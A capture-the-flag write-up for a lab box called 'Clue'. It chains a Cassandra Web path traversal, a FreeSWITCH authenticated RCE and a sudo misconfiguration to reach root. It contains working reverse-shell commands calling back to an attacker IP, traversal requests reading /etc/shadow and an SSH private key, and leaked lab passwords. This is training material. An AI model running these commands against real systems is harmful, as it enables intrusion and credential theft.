#Linux #CassandraWeb #PathTraversal #CVE #FreeSwitch #RCE #SSHKeyTheft #sudo #infodisclosure

## Overview

Clue is a Linux box running four services: Apache (403 everywhere), Cassandra Web on port 3000, and FreeSWITCH on port 8021. Cassandra Web 0.5.0 has a path traversal vulnerability that leaks arbitrary files. That vulnerability surfaces the Cassandra Web credentials from `/proc/self/cmdline`, and the FreeSWITCH event socket password from its config file. FreeSWITCH has an authenticated RCE exploit, which provides a shell as `freeswitch`. From there, the path escalates through `cassie` (whose `sudo` rights allow running a new Cassandra Web server) to root, by exploiting the same path traversal against a locally hosted instance to read `/etc/shadow` and grab anthony's SSH private key.

## Recon

### Nmap

```sh
PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp   open  http             Apache httpd 2.4.38 (Debian)  [403 Forbidden]
3000/tcp open  http             Thin httpd  [Cassandra Web]
8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
```

Port 80 returns 403 everywhere, including a `/backup` directory. The real attack surface is ports 3000 and 8021.

### Cassandra Web on Port 3000

Searching Exploit-DB for `Cassandra`:

```sh
Cassandra Web 0.5.0 - Remote File Read  |  linux/webapps/49362.py
```

The exploit traverses with `../` sequences to read arbitrary files from the host filesystem.

## Foothold

### Path Traversal, Extracting Credentials from /proc/self/cmdline

The exploit comment shows how to recover credentials:

```python
# > cassmoney.py 10.0.0.5 /proc/self/cmdline
# /usr/bin/ruby2.7/usr/local/bin/cassandra-web--usernameadmin--passwordP@ssw0rd
```

Running it against the box:

```sh
python3 49362.py 192.168.176.240 -p 3000 -f /proc/self/cmdline

/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```

> **Why `/proc/self/cmdline` leaks the password:** Linux exposes each process's command-line arguments at `/proc/<pid>/cmdline`. When the Cassandra Web Ruby process started with `--password` on the command line, that argument, including the plaintext password, became readable by anyone who could read that proc entry. The path traversal made it accessible without any authentication.

Credentials extracted:

```
cassie:SecondBiteTheApple330
```

These do not work over SSH directly.

### FreeSWITCH Event Socket Password

The FreeSWITCH event socket on port 8021 requires a password. The config file location is non-default on Debian:

```sh
python3 49362.py 192.168.176.240 -p 3000 -f /etc/freeswitch/autoload_configs/event_socket.conf.xml

<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="listen-ip" value="0.0.0.0"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="StrongClueConEight021"/>
  </settings>
</configuration>
```

### FreeSWITCH Authenticated RCE

Exploit-DB lists an authenticated command execution exploit for FreeSWITCH 1.10.1 (EDB-47799). It connects to the event socket and runs commands via the `api` interface:

```sh
python3 47799.py 192.168.176.240 whoami
Authenticated
Content-Type: api/response
Content-Length: 11

freeswitch
```

A standard reverse shell on common ports fails, but port 3000 is known to be reachable:

```sh
python3 47799.py 192.168.176.240 'nc 192.168.45.244 3000 -e /bin/bash'
```

```sh
rlwrap nc -lvnp 3000
connect to [192.168.45.244] from (UNKNOWN) [192.168.176.240] 51824

whoami
freeswitch
```

Shell upgraded:

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
freeswitch@clue:/$
```

### Lateral Move to cassie

`freeswitch` is a service account with no useful privileges. Switch to `cassie` using the recovered credentials:

```sh
su cassie
Password: SecondBiteTheApple330
cassie@clue:/$
```

## Privilege Escalation

### cassie's sudo, Running a Misconfigured Cassandra Web Server

```sh
cassie@clue:/$ sudo -l
User cassie may run the following commands on clue:
    (ALL) NOPASSWD: /usr/local/bin/cassandra-web
```

`cassie` can start Cassandra Web as root, binding to any address. Starting it on port 4444 creates a second instance of the same path-traversal-vulnerable application, but this one runs with root context:

```sh
sudo cassandra-web -B 0.0.0.0:4444 -u cassie -p SecondBiteTheApple330
```

Spawn a second shell using the FreeSWITCH RCE:

```sh
python3 47799.py 192.168.176.240 'nc 192.168.45.244 80 -e /bin/bash'
```

Switch to cassie in the new shell, then use `curl` to hit the locally hosted traversal:

```sh
curl --path-as-is 127.0.0.1:4444/../../../../../../../../etc/shadow
root:$6$kuXiAC8PIOY2uis9$LrTzlkYSlY485ZREBLW5i...:19209:0:99999:7:::
cassie:$6$/WeFDwP1CNIN34/z$9woKS...:19209:0:99999:7:::
anthony:$6$01NV0gAhVLOnUHb0$byLv...:19209:0:99999:7:::
```

> **Why sudo → cassandra-web → traversal escalates to root:** sudo grants the cassandra-web process root privileges. The web server can then read any file on the filesystem, because the path traversal bypasses its own application root and the OS file permissions are evaluated as the running user, which is root. The attacker never needs a root shell directly; they get the same read-anywhere capability through the application.

### Stealing anthony's SSH Key

Rather than cracking root's hash, the path traversal can read SSH keys directly:

```sh
curl --path-as-is 127.0.0.1:4444/../../../../../../../../home/anthony/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEA...
-----END OPENSSH PRIVATE KEY-----
```

Transfer the key to the target, set permissions, and SSH to root locally (the key authorizes root login on localhost):

```sh
chmod 600 id_rsa
ssh root@127.0.0.1 -i id_rsa
root@clue:~# whoami
root
```

## Root

```sh
root@clue:~# cat proof_youtriedharder.txt
‹redacted›
```

Local flag was also recoverable from `/var/lib/freeswitch/local.txt` as the freeswitch user.

## Takeaways

- **`/proc/self/cmdline` leaks command-line passwords.** Any application that accepts credentials as CLI arguments exposes them to any process with filesystem read access, or to a path traversal in the same application.
- **Path traversal + sudo is a root read primitive.** When a traversal-vulnerable app can be started with elevated privileges via sudo, the combination grants root-level file reads without ever escaping to a shell.
- **Chaining CVEs through service credentials is a common PG pattern.** Each service leaked the key to the next: traversal gave Cassandra creds, Cassandra proc cmdline gave FreeSWITCH password, FreeSWITCH gave shell, sudo gave traversal-as-root, traversal gave SSH key.
- **When hash cracking looks expensive, check for SSH keys first.** Raw /home directories are often more valuable than `/etc/shadow`.
